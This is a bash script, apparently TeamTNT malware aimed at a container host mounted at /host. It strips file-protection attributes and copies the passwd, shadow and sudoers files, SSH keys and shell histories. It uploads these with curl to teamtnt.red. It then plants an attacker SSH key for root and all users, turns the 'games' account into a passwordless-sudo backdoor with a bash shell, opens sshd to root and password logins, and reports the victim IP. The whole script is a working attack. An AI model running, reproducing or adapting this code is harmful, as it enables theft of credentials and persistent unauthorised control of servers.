#!/bin/bash
RAS_KEY='ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFO/EFQQxBqSY+X93ECTUYQLxAzf5s0pnaOu4RZPmSGn17b7Kixa8j2BKOu/mL1nvfBuuYohdihdT7RVaEJDPg7lKbsGUDhaH6ifEH0ADYTjx81jzOaPC0gyiYuVZKqt2nAHAP0a7oiJq0g6HZ4f3fMD1a369pQofomOjTq3cbXvLOSiuEq1pDfRmNSMM0m6BDiRhpqR9kSF2t0zY4hpmN+v1AamfNRtJ1LDXoSGJW8kl5/LAnoJEDHaycNtAPUsMpAgpxfY/nMOjTvlZEHbA7SlnC36Cpw9RELDK5zipMUNuptUpZHEfO7j8OrhW98C5BGoTjk8L5UXQ/lPahsXyd+/4ztpO4yVjLR40leD5SvsM8HSOEC8t70VL3FCdoT5tcU9Td5XY+WpJ98EE1tBpdvyKV69co39DEqQPdT0j073SUtc5rduy6JQnvs+E3VhI6ZVoT0TydJkhfjNOykBLo+2UBEHCIKr1YTRewYsgtjCl3r3oWdZ06YuLrrYt7Ih4N/WHIjVgfzzryvs0xhglWxpfQRl/upz1PUEedGm/j8g+osJyl+4XR+neJWITg1jfnjzHuCyaUarOTwysJ9KjSdxYG1YrsZr+OzGoSF2YtusJd+Dl9mLQ7Io4jsrUslUre67Ym0Dj9PDRDhmCED6HR7BimwA9QtMg/MZlH4BelUQ== root@'$(cat /etc/hostname)''
TMP_DIR="/tmp/.data/.upload/games"
THEPATH="/host"

chattr -ia $THEPATH/tmp/ $THEPATH/usr/ $THEPATH/usr/bin/ $THEPATH/usr/sbin/ $THEPATH/bin/ $THEPATH/sbin/ $THEPATH/usr/games/ $THEPATH/usr/games/.ssh/ $THEPATH/usr/games/sbin/ $THEPATH/etc/ 2>/dev/null
tntrecht -ia $THEPATH/tmp/ $THEPATH/usr/ $THEPATH/usr/bin/ $THEPATH/usr/sbin/ $THEPATH/bin/ $THEPATH/sbin/ $THEPATH/usr/games/ $THEPATH/usr/games/.ssh/ $THEPATH/usr/games/sbin/ $THEPATH/etc/ 2>/dev/null
chattr -R -ia $THEPATH/home/ $THEPATH/root/ 2>/dev/null; tntrecht -R -ia $THEPATH/home/ $THEPATH/root/ 2>/dev/null

chattr -ia $THEPATH/bin/curl 2>/dev/null; tntrecht -ia $THEPATH/bin/curl 2>/dev/null
chmod 1777 $THEPATH/bin/curl 2>/dev/null; chmod +x $THEPATH/bin/curl 2>/dev/null
chattr -ia $THEPATH/usr/bin/curl 2>/dev/null; tntrecht -ia $THEPATH/usr/bin/curl 2>/dev/null
chmod 1777 $THEPATH/usr/bin/curl 2>/dev/null; chmod +x $THEPATH/usr/bin/curl 2>/dev/null

if ! type sudo 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y sudo 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y sudo 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add sudo 2>/dev/null 1>/dev/null; fi
fi
if ! type chattr 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y e2fsprogs 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add e2fsprogs 2>/dev/null 1>/dev/null; fi
fi
if ! type bash 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then apt-get update --fix-missing 2>/dev/null 1>/dev/null; apt-get install -y bash 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then yum clean all 2>/dev/null 1>/dev/null; yum install -y bash 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then apk update 2>/dev/null 1>/dev/null; apk add bash 2>/dev/null 1>/dev/null; fi
fi
if ! type curl 2>/dev/null 1>/dev/null; then
if type apt-get 2>/dev/null 1>/dev/null; then 
	apt-get update --fix-missing 2>/dev/null 1>/dev/null; 
	apt-get install -y curl 2>/dev/null 1>/dev/null; 
	apt-get install -y --reinstall curl 2>/dev/null 1>/dev/null; fi
if type yum 2>/dev/null 1>/dev/null; then 
	yum clean all 2>/dev/null 1>/dev/null; 
	yum install -y curl 2>/dev/null 1>/dev/null; 
	yum reinstall -y curl 2>/dev/null 1>/dev/null; fi
if type apk 2>/dev/null 1>/dev/null; then 
	apk update 2>/dev/null 1>/dev/null; 
	apk add curl 2>/dev/null 1>/dev/null; fi
fi

mkdir -p $TMP_DIR
ls -1 $THEPATH/home/ > $TMP_DIR/users.txt
cp $THEPATH/etc/passwd $TMP_DIR/passwd
cp $THEPATH/etc/shadow $TMP_DIR/shadow
cp $THEPATH/etc/sudoers $TMP_DIR/sudoers
cp $THEPATH/etc/group $TMP_DIR/group
cp $THEPATH/etc/hosts $TMP_DIR/hosts

tar cvzf $TMP_DIR/root.ssh.tar.gz $THEPATH/root/.ssh/ $THEPATH/root/.bash_history 
chattr -ia $THEPATH/root/ $THEPATH/root/.ssh/ 2>/dev/null; tntrecht -ia $THEPATH/root/ $THEPATH/root/.ssh/ 2>/dev/null
cat $THEPATH/root/.ssh/authorized_keys | grep 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFO/EFQQxBqSY+X93ECTUYQLxAzf5s0pnaOu4RZPmSGn17b7Kixa8j2BKOu/mL1nvfBuuYohdihdT7RVaEJDPg7lKbsGUDhaH6ifEH0ADYTjx81jzOaPC0gyiYuVZKqt2nAHAP0a7oiJq0g6HZ4f3fMD1a369pQofomOjTq3cbXvLOSiuEq1pDfRmNSMM0m6BDiRhpqR9kSF2t0zY4hpmN+v1AamfNRtJ1LDXoSGJW8kl5/LAnoJEDHaycNtAPUsMpAgpxfY/nMOjTvlZEHbA7SlnC36Cpw9RELDK5zipMUNuptUpZHEfO7j8OrhW98C5BGoTjk8L5UXQ/lPahsXyd+/4ztpO4yVjLR40leD5SvsM8HSOEC8t70VL3FCdoT5tcU9Td5XY+WpJ98EE1tBpdvyKV69co39DEqQPdT0j073SUtc5rduy6JQnvs+E3VhI6ZVoT0TydJkhfjNOykBLo+2UBEHCIKr1YTRewYsgtjCl3r3oWdZ06YuLrrYt7Ih4N/WHIjVgfzzryvs0xhglWxpfQRl/upz1PUEedGm/j8g+osJyl+4XR+neJWITg1jfnjzHuCyaUarOTwysJ9KjSdxYG1YrsZr+OzGoSF2YtusJd+Dl9mLQ7Io4jsrUslUre67Ym0Dj9PDRDhmCED6HR7BimwA9QtMg/MZlH4BelUQ' || echo $RAS_KEY >> $THEPATH/root/.ssh/authorized_keys
cat $THEPATH/root/.ssh/authorized_keys2 | grep 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFO/EFQQxBqSY+X93ECTUYQLxAzf5s0pnaOu4RZPmSGn17b7Kixa8j2BKOu/mL1nvfBuuYohdihdT7RVaEJDPg7lKbsGUDhaH6ifEH0ADYTjx81jzOaPC0gyiYuVZKqt2nAHAP0a7oiJq0g6HZ4f3fMD1a369pQofomOjTq3cbXvLOSiuEq1pDfRmNSMM0m6BDiRhpqR9kSF2t0zY4hpmN+v1AamfNRtJ1LDXoSGJW8kl5/LAnoJEDHaycNtAPUsMpAgpxfY/nMOjTvlZEHbA7SlnC36Cpw9RELDK5zipMUNuptUpZHEfO7j8OrhW98C5BGoTjk8L5UXQ/lPahsXyd+/4ztpO4yVjLR40leD5SvsM8HSOEC8t70VL3FCdoT5tcU9Td5XY+WpJ98EE1tBpdvyKV69co39DEqQPdT0j073SUtc5rduy6JQnvs+E3VhI6ZVoT0TydJkhfjNOykBLo+2UBEHCIKr1YTRewYsgtjCl3r3oWdZ06YuLrrYt7Ih4N/WHIjVgfzzryvs0xhglWxpfQRl/upz1PUEedGm/j8g+osJyl+4XR+neJWITg1jfnjzHuCyaUarOTwysJ9KjSdxYG1YrsZr+OzGoSF2YtusJd+Dl9mLQ7Io4jsrUslUre67Ym0Dj9PDRDhmCED6HR7BimwA9QtMg/MZlH4BelUQ' || echo $RAS_KEY > $THEPATH/root/.ssh/authorized_keys2
chattr +a $THEPATH/root/.ssh/authorized_keys 2>/dev/null; tntrecht +a $THEPATH/root/.ssh/authorized_keys 2>/dev/null
chattr +i $THEPATH/root/.ssh/authorized_keys2 2>/dev/null; tntrecht +i $THEPATH/root/.ssh/authorized_keys2 /root/.ssh/ 2>/dev/null


while read UNAME
do
chattr -ia $THEPATH/home/ $THEPATH/home/$UNAME/ $THEPATH/home/$UNAME/.ssh/ $THEPATH/home/$UNAME/.ssh/authorized_keys $THEPATH/home/$UNAME/.ssh/authorized_keys2 2>/dev/null
tntrecht -ia $THEPATH/home/ $THEPATH/home/$UNAME/ $THEPATH/home/$UNAME/.ssh/ $THEPATH/home/$UNAME/.ssh/authorized_keys $THEPATH/home/$UNAME/.ssh/authorized_keys2 2>/dev/null
if [ ! -d $THEPATH/home/$UNAME/.ssh/ ]; then mkdir -p $THEPATH/home/$UNAME/.ssh/ 2>/dev/null; fi
tar cvzf $TMP_DIR/$UNAME.ssh.tar.gz $THEPATH/home/$UNAME/.ssh/ $THEPATH/home/$UNAME/.bash_history
cat $THEPATH/home/$UNAME/.ssh/authorized_keys | grep 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFO/EFQQxBqSY+X93ECTUYQLxAzf5s0pnaOu4RZPmSGn17b7Kixa8j2BKOu/mL1nvfBuuYohdihdT7RVaEJDPg7lKbsGUDhaH6ifEH0ADYTjx81jzOaPC0gyiYuVZKqt2nAHAP0a7oiJq0g6HZ4f3fMD1a369pQofomOjTq3cbXvLOSiuEq1pDfRmNSMM0m6BDiRhpqR9kSF2t0zY4hpmN+v1AamfNRtJ1LDXoSGJW8kl5/LAnoJEDHaycNtAPUsMpAgpxfY/nMOjTvlZEHbA7SlnC36Cpw9RELDK5zipMUNuptUpZHEfO7j8OrhW98C5BGoTjk8L5UXQ/lPahsXyd+/4ztpO4yVjLR40leD5SvsM8HSOEC8t70VL3FCdoT5tcU9Td5XY+WpJ98EE1tBpdvyKV69co39DEqQPdT0j073SUtc5rduy6JQnvs+E3VhI6ZVoT0TydJkhfjNOykBLo+2UBEHCIKr1YTRewYsgtjCl3r3oWdZ06YuLrrYt7Ih4N/WHIjVgfzzryvs0xhglWxpfQRl/upz1PUEedGm/j8g+osJyl+4XR+neJWITg1jfnjzHuCyaUarOTwysJ9KjSdxYG1YrsZr+OzGoSF2YtusJd+Dl9mLQ7Io4jsrUslUre67Ym0Dj9PDRDhmCED6HR7BimwA9QtMg/MZlH4BelUQ' || echo $RAS_KEY >> $THEPATH/home/$UNAME/.ssh/authorized_keys
cat $THEPATH/home/$UNAME/.ssh/authorized_keys2 | grep 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDFO/EFQQxBqSY+X93ECTUYQLxAzf5s0pnaOu4RZPmSGn17b7Kixa8j2BKOu/mL1nvfBuuYohdihdT7RVaEJDPg7lKbsGUDhaH6ifEH0ADYTjx81jzOaPC0gyiYuVZKqt2nAHAP0a7oiJq0g6HZ4f3fMD1a369pQofomOjTq3cbXvLOSiuEq1pDfRmNSMM0m6BDiRhpqR9kSF2t0zY4hpmN+v1AamfNRtJ1LDXoSGJW8kl5/LAnoJEDHaycNtAPUsMpAgpxfY/nMOjTvlZEHbA7SlnC36Cpw9RELDK5zipMUNuptUpZHEfO7j8OrhW98C5BGoTjk8L5UXQ/lPahsXyd+/4ztpO4yVjLR40leD5SvsM8HSOEC8t70VL3FCdoT5tcU9Td5XY+WpJ98EE1tBpdvyKV69co39DEqQPdT0j073SUtc5rduy6JQnvs+E3VhI6ZVoT0TydJkhfjNOykBLo+2UBEHCIKr1YTRewYsgtjCl3r3oWdZ06YuLrrYt7Ih4N/WHIjVgfzzryvs0xhglWxpfQRl/upz1PUEedGm/j8g+osJyl+4XR+neJWITg1jfnjzHuCyaUarOTwysJ9KjSdxYG1YrsZr+OzGoSF2YtusJd+Dl9mLQ7Io4jsrUslUre67Ym0Dj9PDRDhmCED6HR7BimwA9QtMg/MZlH4BelUQ' || echo $RAS_KEY > $THEPATH/home/$UNAME/.ssh/authorized_keys2
chattr +i $THEPATH/home/$UNAME/.ssh/authorized_keys2 2>/dev/null; tntrecht +i $THEPATH/home/$UNAME/.ssh/authorized_keys2 2>/dev/null
chattr +a $THEPATH/home/$UNAME/.ssh/authorized_keys 2>/dev/null; tntrecht +a $THEPATH/home/$UNAME/.ssh/authorized_keys 2>/dev/null
done < $TMP_DIR/users.txt

chattr -ia /tmp/ 2>/dev/null; tntrecht -ia /tmp/ 2>/dev/null
tar cvzf /tmp/games.tar.gz $TMP_DIR/ 2>/dev/null
curl -F "userfile=@/tmp/games.tar.gz" https://teamtnt.red/LastPublicRound/index.php
rm -f /tmp/games.tar.gz
rm -fr $TMP_DIR

chattr -ia $THEPATH/etc/ $THEPATH/etc/passwd $THEPATH/etc/shadow $THEPATH/etc/sudoers $THEPATH/etc/group $THEPATH/bin/bash $THEPATH/usr/ 2>/dev/null; tntrecht -ia $THEPATH/etc/ $THEPATH/etc/passwd $THEPATH/etc/shadow $THEPATH/etc/sudoers $THEPATH/etc/group $THEPATH/bin/bash $THEPATH/usr/ 2>/dev/null
chattr -R -ia $THEPATH/usr/games/
if [ ! -d "$THEPATH/usr/games/.ssh/" ]; then mkdir -p $THEPATH/usr/games/.ssh/ 2>/dev/null; fi
if [ ! -d "$THEPATH/usr/games/sbin/" ]; then mkdir -p $THEPATH/usr/games/sbin/ 2>/dev/null; fi
if [ ! -f "$THEPATH/usr/games/sbin/nologin" ]; then cp $THEPATH/bin/bash $THEPATH/usr/games/sbin/nologin 2>/dev/null; chmod +x $THEPATH/usr/games/sbin/nologin 2>/dev/null; fi
chattr -ia $THEPATH/usr/ $THEPATH/usr/games/ $THEPATH/usr/games/.ssh/ $THEPATH/usr/games/.ssh/authorized_keys $THEPATH/usr/games/.ssh/authorized_keys2 2>/dev/null
tntrecht -ia $THEPATH/usr/ $THEPATH/usr/games/ $THEPATH/usr/games/.ssh/ $THEPATH/usr/games/.ssh/authorized_keys $THEPATH/usr/games/.ssh/authorized_keys2 2>/dev/null
echo $RAS_KEY > $THEPATH/usr/games/.ssh/authorized_keys
echo $RAS_KEY > $THEPATH/usr/games/.ssh/authorized_keys2
chattr +i $THEPATH/usr/games/.ssh/authorized_keys $THEPATH/usr/games/.ssh/authorized_keys2 $THEPATH/usr/games/.ssh/ 2>/dev/null
tntrecht +i $THEPATH/usr/games/.ssh/authorized_keys $THEPATH/usr/games/.ssh/authorized_keys2 $THEPATH/usr/games/.ssh/ 2>/dev/null

if ! grep 'games ALL=(ALL) NOPASSWD:ALL' "$THEPATH/etc/sudoers" 2>/dev/null 1>/dev/null; then
chattr -ia $THEPATH/etc/ $THEPATH/etc/sudoers 2>/dev/null; tntrecht -ia $THEPATH/etc/ $THEPATH/etc/sudoers 2>/dev/null
sed -i '/be edited with the/a\games ALL=(ALL) NOPASSWD:ALL' $THEPATH/etc/sudoers
chattr +a $THEPATH/etc/sudoers 2>/dev/null; tntrecht +a $THEPATH/etc/sudoers 2>/dev/null
fi

chattr -ia $THEPATH/etc/ $THEPATH/etc/passwd $THEPATH/etc/shadow 2>/dev/null; tntrecht -ia $THEPATH/etc/ $THEPATH/etc/passwd $THEPATH/etc/shadow 2>/dev/null
sed -i '/games/c\games:x:5:60:games:/usr/games:/usr/games/sbin/nologin' $THEPATH/etc/passwd
sed -i '/games/c\games:$6$UEVlXTpE$U5mxd/ZEpaAwZ.JI0r9Keqog.dYDei6tAnOBQqLRD7fJovJv.mRHfRsKymMhHzD9OORNJIh1otA5dVefxFWJh.:18572:0:99999:7:::' $THEPATH/etc/shadow

chattr -ia $THEPATH/etc/ $THEPATH/etc/ssh/ $THEPATH/etc/ssh/sshd_config 2>/dev/null ; tntrecht -ia $THEPATH/etc/ $THEPATH/etc/ssh/ $THEPATH/etc/ssh/sshd_config 2>/dev/null
sed -i '/PermitRootLogin/c\PermitRootLogin yes' $THEPATH/etc/ssh/sshd_config
sed -i '/PubkeyAuthentication/c\PubkeyAuthentication yes' $THEPATH/etc/ssh/sshd_config
sed -i '/PasswordAuthentication/c\PasswordAuthentication yes' $THEPATH/etc/ssh/sshd_config
chattr +i $THEPATH/etc/ssh/sshd_config 2>/dev/null ; tntrecht +i $THEPATH/etc/ssh/sshd_config 2>/dev/null 


curl -Lk https://teamtnt.red/ip_log/getip.php?ses=gamesaxx


